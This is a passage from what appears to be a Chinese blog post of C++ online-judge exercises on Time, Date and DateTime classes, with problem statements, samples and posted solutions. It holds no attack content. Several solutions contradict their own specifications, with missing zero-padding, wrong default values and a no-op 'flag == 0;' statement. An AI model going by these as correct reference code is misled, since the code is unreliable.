<h2 id="Sample-Input-32"><a href="#Sample-Input-32" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-32"><a href="#Sample-Output-32" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>++t      –t      t        t–      t++      t       00:00:02 00:00:01 00:00:01 00:00:01 00:00:00 00:00:0101:00:00 00:59:59 00:59:59 00:59:59 00:59:58 00:59:59error!!! error!!! error!!! error!!! error!!! error!!!23:00:01 23:00:00 23:00:00 23:00:00 22:59:59 23:00:0000:00:00 23:59:59 23:59:59 23:59:59 23:59:58 23:59:59error!!! error!!! error!!! error!!! error!!! error!!!</p>
<h2 id="HINT-32"><a href="#HINT-32" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<p>left      ：设置输出左对齐</p>
<p>right     ：设置输出优对齐</p>
<h2 id="Append-Code-32"><a href="#Append-Code-32" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1396&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time
&#123;
private:
    int h,m,s;
    int flag;
public:
    friend istream &amp; operator &gt;&gt; (istream &amp;is,Time &amp;t)
    &#123;
        is&gt;&gt;t.h&gt;&gt;t.m&gt;&gt;t.s;
        if(t.h&gt;23||t.h&lt;0||t.m&gt;59||t.m&lt;0||t.s&gt;59||t.s&lt;0)
            t.flag = 1;
        else t.flag = 0;
        return is;
    &#125;
    friend ostream &amp; operator &lt;&lt; (ostream &amp;os,const Time &amp;t)
    &#123;
        if(t.h*3600+t.m*60+t.s&gt;=24*3600||t.h&lt;0||t.s&lt;0||t.m&lt;0||t.m&gt;59||t.s&gt;59) &#123;os&lt;&lt;&quot;error!!!&quot;;&#125;
    else &#123;os&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.h&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;t.m&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;t.s;&#125;
    return os;
    &#125;
    Time &amp; operator ++ ()
    &#123;
        if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return *this;
        else
        &#123;
            flag=((h*3600+m*60+s)+1)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return *this;
        &#125;
    &#125;
    Time &amp;operator --()
    &#123;
         if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return *this;
        else
        &#123;
            flag=((h*3600+m*60+s)-1+24*3600)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return *this;
        &#125;
    &#125;
    Time operator ++ (int )
    &#123;
        Time t = (*this);
        if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return t;
        else
        &#123;
            flag=((h*3600+m*60+s)+1)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return t;
        &#125;
    &#125;
     Time operator --(int)
    &#123;
        Time t = (*this);
         if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return t;
        else
        &#123;
            flag=((h*3600+m*60+s)-1+24*3600)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return t;
        &#125;
    &#125;
&#125;;
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;++t&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;--t&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t--&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t++&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t&quot;&lt;&lt;right&lt;&lt;endl;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin&gt;&gt;t;
        cout&lt;&lt;(++t)&lt;&lt;&quot; &quot;;
        cout&lt;&lt;(--t)&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t--&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t++&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t&lt;&lt;endl;
    &#125;
&#125;
</code></pre>
<h3 id="34-时间和日期类（I）"><a href="#34-时间和日期类（I）" class="headerlink" title="34.时间和日期类（I）"></a>34.时间和日期类（I）</h3><blockquote>
<h2 id="Description-33"><a href="#Description-33" class="headerlink" title="Description"></a>Description</h2><p>设计一个时间类和一个日期类，用于读取输入的数据，按格式输出日期和时间。</p>
<p>设计日期类Date需支持以下操作：</p>
<p>Date::Date(int,int,int)构造方法：传入的参数依次为年月日，用参数将日期初始化。</p>
<p>Date::showDate()按格式输出Date对象。</p>
<p>设计时间类Time需支持以下操作：</p>
<p>Time::Time(int,int,int)构造方法：传入的参数依次为时分秒，用参数将时间初始化。</p>
<p>Time::showTime()按格式输出Time对象。</p>
<p>-—————————————————————————-</p>
<p>你设计Date类和Time类，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-33"><a href="#Input-33" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据。</p>
<p>后面的输入每行为一组测试数据。每组测试数据的前3个整数是日期的年月日，后3个整数是时间的时分秒。</p>
<h2 id="Output-33"><a href="#Output-33" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一行输出。日期的输出格式为“yyyy-mm-dd”，时间的输出格式为“hh:mm:ss”，中间用一个空格分开。</p>
<h2 id="Sample-Input-33"><a href="#Sample-Input-33" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-33"><a href="#Sample-Output-33" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>1982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-33"><a href="#HINT-33" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-33"><a href="#Append-Code-33" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1574&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Date&#123;
public:
    int y,m,d;
    Date()&#123;&#125;
    Date(int yy,int mm,int dd):y(yy),m(mm),d(dd)&#123;&#125;
    void showDate()&#123;
        cout &lt;&lt; y &lt;&lt; &quot;-&quot; &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; m &lt;&lt; &quot;-&quot; &lt;&lt; d;
    &#125;
&#125;;
class Time&#123;
public:
    int h,m,s;
    Time()&#123;&#125;
    Time(int hh,int mm,int ss):h(hh),m(mm),s(ss)&#123;&#125;
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; s &lt;&lt; endl;
    &#125;

&#125;;
/////////////////////////////
int main()
&#123;
    int cases;
    cin &gt;&gt; cases;
    for(int ca = 0; ca &lt; cases; ca++)
    &#123;
        int year, month, day;
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;
        Date date(year, month, day);
        date.showDate();
        cout &lt;&lt; &quot; &quot;;
        int hour, minute, second;
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;
        Time time(hour, minute, second);
        time.showTime();
        cout &lt;&lt; endl;
    &#125;
&#125;</code></pre>
<h3 id="35-时间和日期类（II）"><a href="#35-时间和日期类（II）" class="headerlink" title="35.时间和日期类（II）"></a>35.时间和日期类（II）</h3><blockquote>
<h2 id="Description-34"><a href="#Description-34" class="headerlink" title="Description"></a>Description</h2><p>设计一个日期时间类，用于读取输入的数据，按格式输出日期和时间。</p>
<p>设计日期时间类DateTime由2个成员组成，分别是一个Date类对象和一个Time类对象；</p>
<p>设计DateTime类需支持以下操作：</p>
<p>DateTime::DateTime()无参构造方法：初始化为1年1月1日、0时0分0秒；</p>
<p>DateTime::DateTime(const Date&amp;,const Time&amp;)构造方法：依照参数传入的日期和时间初始化对象；</p>
<p>DateTime::DateTime(int,int,int,int,int,int)构造方法：依照参数（顺序为年月日、时分秒）初始化对象；</p>
<p>DateTime::showDateTime()方法：按格式输出DateTime对象；</p>
<p>DateTime::setDateTime(int,int,int,int,int,int)方法：依照参数（顺序为年月日、时分秒）修改对象的属性值；</p>
<p>DateTime类包含了两个类：Date类和Time类</p>
<p>设计日期类Date需支持以下操作：</p>
<p>Date::Date()无参构造方法：初始化为1年1月1日</p>
<p>Date::Date(int,int,int)构造方法：传入的参数依次为年月日，用参数将日期初始化。</p>
<p>Date::showDate()方法：按格式输出Date对象。</p>
<p>Date::setDate(int,int,int)方法：传入的参数依次为年月日，用参数修改对象的属性值</p>
<p>设计时间类Time需支持以下操作：</p>
<p>Time::Time()无参构造方法：初始化为0时0分0秒</p>
<p>Time::Time(int,int,int)构造方法：传入的参数依次为时分秒，用参数将时间初始化。</p>
<p>Time::showTime()方法：按格式输出Time对象。</p>
<p>Time::setTime(int,int,int)方法：传入的参数依次为时分秒，用参数修改对象的属性值</p>
<p>-—————————————————————————-</p>
<p>你设计DateTime类、Date类和Time类，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-34"><a href="#Input-34" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据。</p>
<p>后面的输入每行为一组测试数据。每组测试数据的前3个整数是日期的年月日，后3个整数是时间的时分秒。</p>
<h2 id="Output-34"><a href="#Output-34" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一行输出。日期的输出格式为“yyyy-mm-dd”，时间的输出格式为“hh:mm:ss”，中间用一个空格分开。</p>
<h2 id="Sample-Input-34"><a href="#Sample-Input-34" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-34"><a href="#Sample-Output-34" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>1000-10-10 01:01:011982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-34"><a href="#HINT-34" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-34"><a href="#Append-Code-34" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1575&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Date&#123;
public:
    friend class DateTime;
    int y,m,d;
    Date():y(1),m(1),d(1)&#123;&#125;
    Date(int yy,int mm,int dd):y(yy),m(mm),d(dd)&#123;&#125;
    void showDate()&#123;cout &lt;&lt; y &lt;&lt; &quot;-&quot; &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; m &lt;&lt; &quot;-&quot; &lt;&lt; d &lt;&lt; &quot; &quot;;&#125;
    Date&amp; setDate(int yy,int mm,int dd)&#123;y=yy;m=mm;d=dd;return *this;&#125;
&#125;;
class Time&#123;
public:
    friend class DateTime;
    int h,m,s;
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh,int mm,int ss):h(hh),m(mm),s(ss)&#123;&#125;
    void showTime()&#123;cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; s ;&#125;
    Time&amp; setTime(int hh,int mm,int ss)&#123;h=hh;m=mm;s=ss;return *this;&#125;
&#125;;
class DateTime&#123;
public:
    friend class Date;
    friend class Time;
    Date D;
    Time T;
    DateTime():D(0,0,0),T(0,0,0)&#123;&#125;
    DateTime(const Date&amp; d,const Time&amp; t):D(d),T(t)&#123;&#125;
    DateTime(int a,int b,int c,int d,int e,int f):D(a,b,c),T(d,e,f)&#123;&#125;
    void showDateTime()&#123;D.showDate();T.showTime();&#125;
    DateTime&amp; setDateTime(int a,int b,int c,int d,int e,int f)&#123;D.y=a;D.m=b;D.d=c;T.h=d;T.m=e;T.s=f;return *this;&#125;
&#125;;
///////////////////
int main()
&#123;
    Date date(1000, 10, 10);
    Time time(1, 1, 1);
    DateTime date_time(date, time);
    date_time.showDateTime();
    cout &lt;&lt; endl;
    int cases, flag = 0;
    cin &gt;&gt; cases;
    for(int ca = 0; ca &lt; cases; ca++)
    &#123;
        int year, month, day;
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;
        int hour, minute, second;
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;
        if(flag == 0)
        &#123;
            flag = 1;
            DateTime dt(year, month, day, hour, minute, second);
            dt.showDateTime();
        &#125;
        else if(flag == 1)
        &#123;
            flag == 0;
            date_time.setDateTime(year, month, day, hour, minute, second).showDateTime();
        &#125;
        cout &lt;&lt; endl;
    &#125;
&#125;</code></pre>
<h3 id="36-时间和日期类（III）"><a href="#36-时间和日期类（III）" class="headerlink" title="36.时间和日期类（III）"></a>36.时间和日期类（III）</h3><blockquote>
<h2 id="Description-35"><a href="#Description-35" class="headerlink" title="Description"></a>Description</h2><p>设计一个日期时间类，用于读取输入的数据，按格式输出日期和时间。</p>
<p>设计日期时间类DateTime由2个成员组成，分别是一个Date类对象和一个Time类对象；</p>
<p>设计DateTime类需支持以下操作：</p>
<p>DateTime::DateTime()无参构造方法：初始化为1年1月1日、0时0分0秒；</p>
<p>DateTime::DateTime(int,int,int,int,int,int)构造方法：依照参数（顺序为年月日、时分秒）初始化对象；</p>
<p>在上述两个DateTime类的构造函数中输出：“CREATE DateTime : (y, m, d, hh, mm, ss)”，其中y、m、d为初始化对象时的年月日值，h、m、s为初始化对象时的时分秒值。参见输出。</p>
<p>DateTime::DateTime(const Date&amp;,const Time&amp;)构造方法：依照参数传入的日期和时间初始化对象；</p>
<p>在这个DateTime类的构造函数中输出：“CREATE DateTime : (y, m, d) (hh, mm, ss)”，其中y、m、d为初始化对象时的年月日值，h、m、s为初始化对象时的时分秒值。参见输出。</p>
<p>DateTime::showDateTime()方法：按格式输出DateTime对象；</p>
<p>DateTime::setDateTime(int,int,int,int,int,int)方法：依照参数（顺序为年月日、时分秒）修改对象的属性值；</p>
<p>DateTime类包含了两个类：Date类和Time类</p>
<p>设计日期类Date需支持以下操作：</p>
<p>Date::Date()无参构造方法：初始化为1年1月1日</p>
<p>Date::Date(int,int,int)构造方法：传入的参数依次为年月日，用参数将日期初始化。</p>
<p>在Date类的构造函数中输出：“CREATE Date : (y, m, d)”，其中y、m、d为初始化对象时的年月日值。参见输出。</p>
<p>Date::showDate()方法：按格式输出Date对象。</p>
<p>Date::setDate(int,int,int)方法：传入的参数依次为年月日，用参数修改对象的属性值</p>
<p>设计时间类Time需支持以下操作：</p>
<p>Time::Time()无参构造方法：初始化为0时0分0秒</p>
<p>Time::Time(int,int,int)构造方法：传入的参数依次为时分秒，用参数将时间初始化。</p>
<p>在Time类的构造函数中输出：“CREATE Time : (h, m, s)”，其中h、m、s为初始化对象时的时分秒值。参见输出</p>
<p>Time::showTime()方法：按格式输出Time对象。</p>
<p>Time::setTime(int,int,int)方法：传入的参数依次为时分秒，用参数修改对象的属性值</p>
<p>-—————————————————————————-</p>
<p>你设计DateTime类、Date类和Time类，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数</p>
<h2 id="Input-35"><a href="#Input-35" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据。</p>
<p>后面的输入每行为一组测试数据。每组测试数据的前3个整数是日期的年月日，后3个整数是时间的时分秒。</p>
<h2 id="Output-35"><a href="#Output-35" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一行输出。日期的输出格式为“yyyy-mm-dd”，时间的输出格式为“hh:mm:ss”，中间用一个空格分开。</p>
<h2 id="Sample-Input-35"><a href="#Sample-Input-35" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-35"><a href="#Sample-Output-35" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>CREATE Time : (0, 0, 0)CREATE Date : (1, 1, 1)CREATE DateTime : (1, 1, 1, 0, 0, 0)0001-01-01 00:00:001982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-35"><a href="#HINT-35" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-35"><a href="#Append-Code-35" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1576&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;algorithm&gt;  
#include &lt;iomanip&gt;  
using namespace std;  


class Time&#123;  
   private:  
      friend class DateTime;  
      int hh,mm,ss;  
   public:  
      Time():hh(0),mm(0),ss(0)&#123;  
          cout&lt;&lt;&quot;CREATE Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time(int a,int b,int c):hh(a),mm(b),ss(c)&#123;&#125;  
      Time &amp;setTime(int a,int b,int c)&#123;hh=a;mm=b;ss=c;return *this;&#125;  
      void showTime()&#123;  
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;hh&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;mm&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;ss;  
      &#125;  
      ~Time()&#123;&#125;  
&#125;;  

class Date&#123;  
   private:  
       friend class DateTime;  
       int year,month,day;  
   public:  
       Date():year(1),month(1),day(1)&#123;  
           cout&lt;&lt;&quot;CREATE Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       Date(int a,int b,int c):year(a),month(b),day(c)&#123;&#125;  
       Date &amp;setDate(int a,int b,int c)&#123;year=a;month=b;day=c;return *this;&#125;  
       void showDate() &#123;  
           cout&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(4)&lt;&lt;year&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;month&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;day&lt;&lt;&quot; &quot;;  
       &#125;  
       ~Date()&#123;&#125;  
&#125;;  



class DateTime&#123;  
   private:  
       friend class Date;  
       friend class Time;  
       Time T;  
       Date D;  
       int year1,month1,day1,hh1,mm1,ss1;  
   public:  
       DateTime()&#123;  
         cout&lt;&lt;&quot;CREATE DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;, &quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(const Date&amp; d,const Time&amp; t):D(d),T(t)&#123;&#125;  
       DateTime(int a,int b,int c,int d,int e,int f):D(a,b,c),T(d,e,f)&#123;&#125;  
       void showDateTime()&#123;  
         D.showDate();  T.showTime();  
       &#125;  
       DateTime &amp;setDateTime(int a,int b,int c,int d,int e,int f)&#123;  
           D.setDate(a,b,c);T.setTime(d,e,f);return *this;  
       &#125;  
       ~DateTime()&#123;&#125;  
&#125;;  

int main()  
&#123;  
    DateTime date_time;  
    date_time.showDateTime();  
    cout &lt;&lt; endl;  
    int cases;  
    cin &gt;&gt; cases;  
    for(int ca = 0; ca &lt; cases; ca++)  
    &#123;  
        int year, month, day;  
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;  
        int hour, minute, second;  
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;  
        date_time.setDateTime(year, month, day, hour, minute, second);  
        date_time.showDateTime();  
        cout &lt;&lt; endl;  
    &#125;  
&#125;  </code></pre>
<h3 id="37-时间和日期类（IV）"><a href="#37-时间和日期类（IV）" class="headerlink" title="37.时间和日期类（IV）"></a>37.时间和日期类（IV）</h3><blockquote>
<h2 id="Description-36"><a href="#Description-36" class="headerlink" title="Description"></a>Description</h2><p>设计一个日期时间类，用于读取输入的数据，按格式输出日期和时间。</p>
<p>设计日期时间类DateTime由2个成员组成，分别是一个Date类对象和一个Time类对象；</p>
<p>设计DateTime类需支持以下操作：</p>
<p>DateTime::DateTime()无参构造方法：初始化为1年1月1日、0时0分0秒；</p>
<p>DateTime::DateTime(int,int,int,int,int,int)构造方法：依照参数（顺序为年月日、时分秒）初始化对象；</p>
<p>在上述两个DateTime类的构造函数中输出：“CREATE DateTime : (y, m, d, hh, mm, ss)”，其中y、m、d为初始化对象时的年月日值，h、m、s为初始化对象时的时分秒值。参见输出。</p>
<p>DateTime::DateTime(const Date&amp;,const Time&amp;)构造方法：依照参数传入的日期和时间初始化对象；</p>
<p>在这个DateTime类的构造函数中输出：“CREATE DateTime : (y, m, d) (hh, mm, ss)”，其中y、m、d为初始化对象时的年月日值，h、m、s为初始化对象时的时分秒值。参见输出。</p>
<p>DateTime:DateTime(const DateTime&amp;)构造方法：拷贝构造函数，初始化对象。</p>
<p>在拷贝构造函数中输出：“COPY   DateTime : (y, m, d) (hh, mm, ss)”，其中y、m、d为初始化对象时的年月日值，h、m、s为初始化对象时的时分秒值。参见输出。</p>
<p>DateTime::showDateTime()方法：按格式输出DateTime对象；</p>
<p>DateTime::setDateTime(int,int,int,int,int,int)方法：依照参数（顺序为年月日、时分秒）修改对象的属性值；</p>
<p>编写DateTime类的读写函数：year()、month()、day()、hour()、minute()、second()。读写函数的参数、返回值参见main()函数。</p>
<p>DateTime类包含了两个类：Date类和Time类</p>
<p>设计日期类Date需支持以下操作：</p>
<p>Date::Date()无参构造方法：初始化为1年1月1日</p>
<p>Date::Date(int,int,int)构造方法：传入的参数依次为年月日，用参数将日期初始化。</p>
<p>在Date类的构造函数中输出：“CREATE Date : (y, m, d)”，其中y、m、d为初始化对象时的年月日值。参见输出。</p>
<p>Date::Date(const Date&amp;)构造方法：拷贝构造函数，初始化对象。</p>
<p>在拷贝构造函数中输出：“COPY   Date : (y, m, d)”，其中y、m、d为初始化对象时的年月日值。参见输出。</p>
<p>Date::showDate()方法：按格式输出Date对象。</p>
<p>Date::setDate(int,int,int)方法：传入的参数依次为年月日，用参数修改对象的属性值</p>
<p>设计时间类Time需支持以下操作：</p>
<p>Time::Time()无参构造方法：初始化为0时0分0秒</p>
<p>Time::Time(int,int,int)构造方法：传入的参数依次为时分秒，用参数将时间初始化。</p>
<p>在Time类的构造函数中输出：“CREATE Time : (h, m, s)”，其中h、m、s为初始化对象时的时分秒值。参见输出</p>
<p>Time::Time(const Time&amp;)构造方法：拷贝构造函数，初始化对象。</p>
<p>在拷贝构造函数中输出：“COPY   Time : (h, m, s)”，其中h、m、s为初始化对象时的时分秒值。参见输出</p>
<p>Time::showTime()方法：按格式输出Time对象。</p>
<p>Time::setTime(int,int,int)方法：传入的参数依次为时分秒，用参数修改对象的属性值</p>
<p>-—————————————————————————-</p>
<p>你设计DateTime类、Date类和Time类，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-36"><a href="#Input-36" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据。</p>
<p>后面的输入每行为一组测试数据。每组测试数据的前3个整数是日期的年月日，后3个整数是时间的时分秒。</p>
<h2 id="Output-36"><a href="#Output-36" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一行输出。日期的输出格式为“yyyy-mm-dd”，时间的输出格式为“hh:mm:ss”，中间用一个空格分开。</p>
<h2 id="Sample-Input-36"><a href="#Sample-Input-36" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-36"><a href="#Sample-Output-36" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>CREATE Date : (1000, 10, 10)COPY   Date : (1000, 10, 10)CREATE Time : (1, 1, 1)COPY   Time : (1, 1, 1)COPY   Time : (1, 1, 1)COPY   Date : (1000, 10, 10)CREATE DateTime : (1000, 10, 10) (1, 1, 1)COPY   Time : (1, 1, 1)COPY   Date : (1000, 10, 10)COPY   DateTime : (1000, 10, 10) (1, 1, 1)DateTime : 1000 10 10 1 1 11982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-36"><a href="#HINT-36" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-36"><a href="#Append-Code-36" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1577&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;algorithm&gt;  
#include &lt;iomanip&gt;  
using namespace std;  


class Time&#123;  
   private:  
      friend class DateTime;  
      int hh,mm,ss;  
   public:  
      Time():hh(0),mm(0),ss(0)&#123;  
          cout&lt;&lt;&quot;CREATE Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time(int a,int b,int c):hh(a),mm(b),ss(c)&#123;  
           cout&lt;&lt;&quot;CREATE Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time(const Time &amp;p):hh(p.hh),mm(p.mm),ss(p.ss)&#123;  
          cout&lt;&lt;&quot;COPY   Time : (&quot;&lt;&lt;hh&lt;&lt;&quot;, &quot;&lt;&lt;mm&lt;&lt;&quot;, &quot;&lt;&lt;ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
      Time &amp;setTime(int a,int b,int c)&#123;hh=a;mm=b;ss=c;return *this;&#125;  
      void showTime()&#123;  
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;hh&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;mm&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;ss;  
      &#125;  
      ~Time()&#123;&#125;  
&#125;;  

class Date&#123;  
   private:  
       friend class DateTime;  
       int year,month,day;  
   public:  
       Date():year(1),month(1),day(1)&#123;  
           cout&lt;&lt;&quot;CREATE Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       Date(const Date &amp;p):year(p.year),month(p.month),day(p.day)&#123;  

          cout&lt;&lt;&quot;COPY   Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
      &#125;  
       Date(int a,int b,int c):year(a),month(b),day(c)&#123;  
